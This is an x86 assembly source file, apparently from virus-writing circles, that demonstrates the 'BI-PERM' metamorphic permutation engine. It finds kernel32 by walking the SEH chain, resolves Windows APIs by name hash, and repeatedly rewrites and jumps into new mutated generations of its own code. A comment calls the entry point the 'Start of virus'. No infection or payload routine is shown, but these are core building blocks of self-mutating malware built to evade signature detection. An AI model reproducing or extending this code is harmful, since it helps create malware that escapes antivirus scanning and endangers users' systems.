
; BI-PERM Demo
; Program that infinitly permutates (till memory end)

	.686
	.model	flat, stdcall
	.code

;===============================================================================
;usefull macros
;===============================================================================

include	macros.inc


PAGE_READWRITE		= 4
MEM_COMMIT		= 1000h

;members of PE file structures 
ExportDirectory		equ 78h
AddressOfEntry		equ 28h
NumberOfNames		equ 18h
AddressOfFunctions	equ 1Ch
AddressOfNames		equ 20h
AddressOfNameOrdinals	equ 24h

code_begin label near
code_size = (code_end-code_begin)

;===============================================================================
;BI-PERM engine
;===============================================================================

include ../inc/permutator.inc

;===============================================================================
;Shell of length-disassembler virxasm32
;===============================================================================

include	../inc/disasm.inc

;===============================================================================
;Standard mutation routine of BI-PERM
;===============================================================================

include ../inc/mutate.inc


;===============================================================================
;Get function address from DLL by name's hash
;input:  ebx - DLL base, ecx - name hash
;output: eax - address of API or -1
;===============================================================================

get_api proc
	pushad
	mov	edi, [ebx+3Ch]
	mov	edi, [edi+ebx+ExportDirectory]
	add	edi, ebx
	
	mov	ebp, [edi+NumberOfNames]
	add	esi, ebx

 _next_api_search:
	dec	ebp
	js	_end_search

	mov	eax, [edi+AddressOfNames]
	add	eax, ebx
	mov	esi, [eax+ebp*4]
	add	esi, ebx
	
	xor	eax, eax
	cdq
 _next_hash_sym:
	lodsb
	imul	edx, edx, 1Fh
	add	edx, eax
	dec	eax
	jns	_next_hash_sym

	cmp	edx, ecx
	jne	_next_api_search

	mov	esi, [edi+AddressOfNameOrdinals]
	add	esi, ebx
	movzx	edx, word ptr [esi+ebp*2]
	
	mov	esi, [edi+AddressOfFunctions]
	lea	eax, [esi+edx*4]
	add	ebx, [eax+ebx]
	xchg	eax, ebx

 _end_search:
	mov	[esp+7*4], eax
	popad
	ret
get_api endp


;===============================================================================
;Get kernel32 base via SEH walker
;input:  df=0 (cld)
;output: ebx - kernel32.dll base
;===============================================================================

get_kernel32 proc
	xor	esi, esi
	lods	dword ptr fs:[esi]
	inc	eax
 nxt_seh_walk:
	dec	eax
	xchg	eax, esi
	lodsd
	inc	eax
	jnz	nxt_seh_walk
	lodsd
	xchg	ebx, eax

	inc	ebx
 find_MZ_krnl32:
	dec	ebx
	xor	bx, bx			;bx = 0000h | sub ebx,10000h
	cmp	word ptr [ebx], 'ZM'	;check on K32 header
	jne	find_MZ_krnl32
	ret
get_kernel32 endp


;===============================================================================
;Get pseudo-random value
;arguments:
;    arg1 - user parameter (pointer to local variable here)
;output:
;    eax - pseudo-random value
;===============================================================================

perm_random proc
	push	ecx
	mov	ecx, [esp+8]
	imul	eax, [ecx], 41C64E6Dh	;operations to get random value
	add	eax, 3039h
	xchg	eax, [ecx]
	pop	ecx
	ret	4
perm_random endp


;===============================================================================
;Start of virus: get APIz and call permutation engine
;===============================================================================

startup proc
	;startup code. executes only once
	push_sz	<\r\nYeah!!!!\r\nLet's start it!!!!\r\n>
	call	get_kernel32
	mov_h	ecx, <VirtualAlloc>
	call	get_api
	xchg	ebx, eax
	
	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	1000h
	push	0
	call	ebx			;allocate temp memory
	xchg	edi, eax
	
	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	1000h
	push	0
	call	ebx
	xchg	esi, eax
	xor	ebx, ebx

	;infinitly mutated code starts here
	;input: edi - buffer with code of previous generation
	;       esi - buffer with code of current generation
	;       ebx - debug counter
code_start:
	;db	10000 dup(90h)
	push	esi			;save address of current generation's memory
	push	ebp
	call	get_kernel32
	mov_h	ecx, <VirtualFree>
	call	get_api
	push	4000h
	push	0
	push	edi			;free memory of previos generation
	call	eax

	mov_h	ecx, <OutputDebugStringA>
	call	get_api
	xchg	esi, eax
	mov	edi, esp
	
	;my brain is broken don't beat me :(
	mov	edx, ebp
	xor	eax, eax
	mov	al, dl
	shl	eax, 4
	shr	al, 4
	xchg	al, ah
	cmp	al, 10
	jb	a
	add	al, 'a'-'0'-10
 a:	cmp	ah, 10
	jb	b
	add	ah, 'a'-'0'-10
 b:	shl	eax, 16
	mov	al, dh
	shl	ax, 4
	shr	al, 4
	xchg	al, ah
	cmp	al, 10
	jb	c
	add	al, 'a'-'0'-10
 c:	cmp	ah, 10
	jb	d
	add	ah, 'a'-'0'-10
 d:	add	eax, 30303030h
	
	push	10
	push	eax
	push	esp
	call	esi
	mov	esp, edi

	mov_h	ecx, <VirtualAlloc>
	call	get_api
	xchg	edi, eax

	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	code_size*50
	push	0
	call	edi			;allocate memory for temp buffer
	xchg	ebp, eax		;temp buffer

	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	code_size*5
	push	0
	call	edi			;allocate memory for new generation
	xchg	edi, eax		;output buffer

	mov_h	ecx, <VirtualFree>
	call	get_api
	push	eax

	mov_h	ecx, <GetTickCount>
	call	get_api
	call	eax
	push	eax			;place for user data (pseudo-random value)
	mov	eax, esp
	cld

	push_of	perm_disasm		;user disasm
	push_of	perm_mutate		;user mutate
	push_of	perm_random		;user random	
	push	eax			;user variable
	push	code_size		;size of first generation
	push	edi			;buffer for mutated code
	push_of	code_start		;code entry point
	push	ebp			;temp buffer
	call	permutate		;let's mutate!

	xchg	ebx, eax
	pop	eax			;clear stack
	pop	eax			;address of VirtualFree
	push	4000h
	push	0
	push	ebp
	call	eax			;clear temp buffer

	mov	esi, edi		;memory of the next generation
	pop	ebp			;debug counter
	inc	ebp
	pop	edi			;buffer of current generation
	jmp	ebx			;call new generation!

code_end label near
startup endp

	end	startup



